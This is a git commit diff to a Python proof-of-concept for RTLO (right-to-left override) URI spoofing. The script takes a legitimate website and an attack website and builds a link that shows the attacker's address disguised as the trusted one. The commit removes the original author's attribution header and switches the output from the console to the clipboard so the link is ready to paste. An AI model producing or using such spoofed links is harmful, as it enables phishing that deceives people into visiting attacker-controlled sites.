52b0ea5cdd9e3c25d231b04ffff7a2a21f5cc972
Asdfsdsddasssdffsdfddf502asfd <101923596+Asdfsdsddasssdffsdfddf502asfd@users.noreply.github.com>
2022-12-22 12:01:16 +0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,13 +1,4 @@
-# !/usr/bin/env python2.7
-# coding=utf-8
-
-#	RTLO Injection URI Spoofing
-# https://github.com/zadewg/RIUS
-#	Copyright (C) zadewg at gmail dot com
-#	RIUS_back.py 2019 August 11th
-
-# This POC uses a different approach than the one provided in exploit.sh
-
+import pyperclip
 import sys
 
 help = "usage: python poc.py <legitimate website> <attack_website> \nnote: this script might not work depending on your consoles character set"
@@ -23,7 +14,7 @@ def main():
     _ATTWEB = sys.argv[2].replace('https://', '')
 
     # [RTLO_mark][legitimate_website]#/[backwards-typed_attackers_website]
-    sys.stdout.write(' ' + _RTLO + (_ATTWEB + '#/' + _LEGWEB) + '\n')
+    pyperclip.copy(' ' + _RTLO + (_ATTWEB + '#/' + _LEGWEB) + '\n')
 
 if __name__ == '__main__':
     main()
